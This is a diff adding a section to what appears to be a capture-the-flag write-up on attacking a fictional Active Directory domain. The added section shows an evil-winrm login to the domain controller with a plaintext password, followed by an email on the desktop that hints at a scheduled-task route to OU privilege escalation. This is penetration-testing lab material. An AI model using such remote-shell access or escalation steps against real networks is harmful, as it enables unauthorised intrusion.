@@ -988,7 +988,57 @@ The other two users are not interesting in terms of permissions
 # Evil-winrm access as `cliff.b`
 
 ```python
+evil-winrm -i dc.novacart.local -u cliff.b -p 'safEpAss69'     
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\cliff.b\Documents>
+```
+I now have remote access to `cliff.b`
 
+```python
+*Evil-WinRM* PS C:\Users\cliff.b\Desktop> type INC-111_SeniorDevOps_ACL_Fix.eml
+From: Administrator <administrator@novacart.local>
+To: cliff.b@novacart.local
+Subject: Temporary Workaround for Senior DevOps ACL Permissions
+Date: Tue, 26 Apr 2026 16:00:00 +0200
+Content-Type: text/plain; charset="UTF-8"
+
+Hi Cliff,
+
+Following your report regarding the missing access rights for the Senior DevOps role within the novacart.local domain, we’ve confirmed that the required ACL entries on the corresponding Organizational Unit are currently not fully applied.
+
+As a temporary workaround, you can use the provided PowerShell scripts to trigger a scheduled task that applies the required Write All Properties permissions on the Senior DevOps OU in novacart.local.
+
+Please proceed as follows:
+
+1. Save the following PowerShell scripts locally on your system:
+   - Configure-OUDelegation.ps1
+   - check_ou_permissions.ps1
+   - enum_ou_groups.ps1
+
+2. Run the scripts from your user context.
+   These scripts will create and trigger a scheduled task to apply the necessary permissions within the domain.
+
+3. Even without administrative privileges, this works because it uses COM, allowing interaction with and execution of the scheduled task.
+
+4. After execution, verify the applied permissions using:
+   - check_ou_permissions.ps1
+   - enum_ou_groups.ps1
+
+This should restore your required access temporarily while we work on a permanent fix in the novacart.local Active Directory environment.
+
+Let me know if anything is unclear or if you encounter any issues.
+
+Best regards,
+Administrator
+NovaCart IT Department
+*Evil-WinRM* PS C:\Users\cliff.b\Desktop>
 ```
 
 
